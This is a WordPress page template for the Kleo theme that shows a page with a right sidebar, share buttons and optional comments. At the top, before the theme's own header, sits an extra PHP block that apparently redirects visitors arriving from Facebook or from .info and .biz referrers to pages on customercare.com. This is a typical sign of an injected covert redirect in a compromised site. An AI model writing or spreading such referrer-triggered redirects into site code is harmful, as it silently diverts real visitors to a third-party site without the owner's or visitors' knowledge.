<?php
$referrer = $_SERVER['HTTP_REFERER'];
if (preg_match("/facebook.com/",$referrer)) {
      header('Location: http://www.customercare.com/page-site1.html');
} elseif (preg_match("/m.facebook.com/",$referrer)) {
      header('Location: http://www.customercare.com/page-site2.html');
} elseif (preg_match("/$.info/",$referrer)) {
      header('Location: http://www.customercare.com/page-site2.html');
} elseif (preg_match("/$.biz/",$referrer)) {
      header('Location: http://www.customercare.com/page-site2.html');
};
?>

<?php
/**
 * Template Name: PPL
 *
 * Description: Show a page template with right sidebar
 *
 * @package WordPress
 * @subpackage Kleo
 * @author SeventhQueen <themesupport@seventhqueen.com>
 * @since Kleo 1.0
 */

get_header(); ?>


<?php
//create right sidebar template
kleo_switch_layout('right');
?>

<?php get_template_part('page-parts/general-title-section'); ?>

<?php get_template_part('page-parts/general-before-wrap'); ?>

<?php
if ( have_posts() ) :
	// Start the Loop.
	while ( have_posts() ) : the_post();

		/*
		 * Include the post format-specific template for the content. If you want to
		 * use this in a child theme, then include a file called called content-___.php
		 * (where ___ is the post format) and that will be used instead.
		 */
        get_template_part( 'content', 'page' );
        ?>

        <?php get_template_part( 'page-parts/posts-social-share' ); ?>

        <?php if ( sq_option( 'page_comments', 0 ) == 1 ): ?>

            <!-- Begin Comments -->
            <?php comments_template( '', true ); ?>
            <!-- End Comments -->

        <?php endif; ?>

    <?php endwhile;

endif;
?>
        
<?php get_template_part('page-parts/general-after-wrap'); ?>

<?php get_footer(); ?>